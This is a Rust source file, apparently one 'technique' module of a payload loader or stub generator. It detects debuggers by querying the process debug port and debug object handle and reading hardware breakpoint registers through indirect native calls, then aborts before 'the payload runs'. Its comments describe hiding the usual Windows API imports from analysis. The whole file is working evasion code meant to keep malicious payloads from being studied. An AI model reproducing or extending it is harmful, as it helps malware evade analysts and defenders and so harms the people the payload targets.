// --- Anti-debug (technique fragment) ---

use windows::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_FLAGS};
#[cfg(target_arch = "x86_64")]
use windows::Win32::System::Diagnostics::Debug::CONTEXT_DEBUG_REGISTERS_AMD64;
#[cfg(target_arch = "x86")]
use windows::Win32::System::Diagnostics::Debug::CONTEXT_DEBUG_REGISTERS_X86;
use windows::Win32::System::Threading::{GetCurrentProcess, GetCurrentThread};

/// `NtQueryInformationProcess` information classes. Compile-time constants, not
/// runtime strings, so they do not need `StringsConfig`.
const PROCESS_DEBUG_PORT: i32 = 7;
const PROCESS_DEBUG_OBJECT_HANDLE: i32 = 30;

/// Whether a positive detection aborts the preparation.
const ABORT_ON_DETECT: bool = $ABORT_ON_DETECT$;

/// Errors produced by the anti-debug preparation.
#[derive(Debug, thiserror::Error)]
pub enum AntiDebugError {
    #[error("a debugger was detected")]
    DebuggerDetected,
}

/// `CONTEXT_DEBUG_REGISTERS` for the stub's architecture: DR0-DR3 are what the
/// hardware-breakpoint check reads, and the flag value differs between x64 and
/// x86 (`0x10010` there).
#[cfg(target_arch = "x86_64")]
const CONTEXT_FLAGS_DEBUG: CONTEXT_FLAGS = CONTEXT_DEBUG_REGISTERS_AMD64;
#[cfg(target_arch = "x86")]
const CONTEXT_FLAGS_DEBUG: CONTEXT_FLAGS = CONTEXT_DEBUG_REGISTERS_X86;

/// `NtGetContextThread` requires a 16-byte aligned `CONTEXT` on x64; the
/// `windows` binding only guarantees 8, so force it here. x86 has no such
/// requirement; the stricter alignment is harmless there.
#[repr(align(16))]
struct AlignedContext(CONTEXT);

/// Checks the current process for a debugger and, depending on the configured
/// action, aborts before the payload runs.
///
/// Several independent signals are combined. A check that cannot be *read*
/// (rather than a positive hit) is treated as "not detected", so an unavailable
/// check never aborts the pipeline by itself. The checks go through the syscall
/// layer's `nt_query_info_process` / `nt_get_context_thread`, so `mode: indirect`
/// removes the `IsDebuggerPresent`/`CheckRemoteDebuggerPresent`/`GetThreadContext`
/// imports.
pub fn anti_debug() -> Result<bool, AntiDebugError> {
    let detected = debugger_present();
    crate::tech_dbg!(
        "anti_debug",
        "debugger detected: {detected} (abort on detect: {ABORT_ON_DETECT})"
    );
    if detected && ABORT_ON_DETECT {
        return Err(AntiDebugError::DebuggerDetected);
    }
    // A Preparation always continues the pipeline when it does not error; only
    // the `bouncer` gate decides to abort (see `techniques/README.md`).
    Ok(true)
}

/// Runs every check and ORs the results.
fn debugger_present() -> bool {
    debug_port_set() || debug_object_set() || hardware_breakpoint_set()
}

/// Asks the kernel for the current process's debug port through
/// `NtQueryInformationProcess(ProcessDebugPort)`. Non-zero means a debugger is
/// attached (the check `CheckRemoteDebuggerPresent` wraps).
fn debug_port_set() -> bool {
    let mut port = 0usize;
    let status = crate::nt_query_info_process(
        unsafe { GetCurrentProcess() },
        PROCESS_DEBUG_PORT,
        &mut port as *mut usize as *mut core::ffi::c_void,
        std::mem::size_of::<usize>() as u32,
        std::ptr::null_mut(),
    );
    let set = status >= 0 && port != 0;
    crate::tech_dbg!("anti_debug", "debug port: {set} (0x{port:x})");
    set
}

/// Asks the kernel for the current process's debug object handle through
/// `NtQueryInformationProcess(ProcessDebugObjectHandle)`. A non-null handle
/// means a debugger is attached (the native analog of `IsDebuggerPresent`).
fn debug_object_set() -> bool {
    let mut handle = 0usize;
    let status = crate::nt_query_info_process(
        unsafe { GetCurrentProcess() },
        PROCESS_DEBUG_OBJECT_HANDLE,
        &mut handle as *mut usize as *mut core::ffi::c_void,
        std::mem::size_of::<usize>() as u32,
        std::ptr::null_mut(),
    );
    let set = status >= 0 && handle != 0;
    crate::tech_dbg!("anti_debug", "debug object handle: {set} (0x{handle:x})");
    set
}

/// Reads the hardware debug registers (DR0–DR3) of the current thread through
/// `NtGetContextThread`. A non-zero register means a debugger set a hardware
/// breakpoint.
fn hardware_breakpoint_set() -> bool {
    let mut context = AlignedContext(CONTEXT::default());
    context.0.ContextFlags = CONTEXT_FLAGS_DEBUG;
    let status = crate::nt_get_context_thread(
        unsafe { GetCurrentThread() },
        &mut context.0 as *mut CONTEXT as *mut core::ffi::c_void,
    );
    if status < 0 {
        return false;
    }
    let set =
        context.0.Dr0 != 0 || context.0.Dr1 != 0 || context.0.Dr2 != 0 || context.0.Dr3 != 0;
    crate::tech_dbg!("anti_debug", "hardware breakpoint registers: {set}");
    set
}
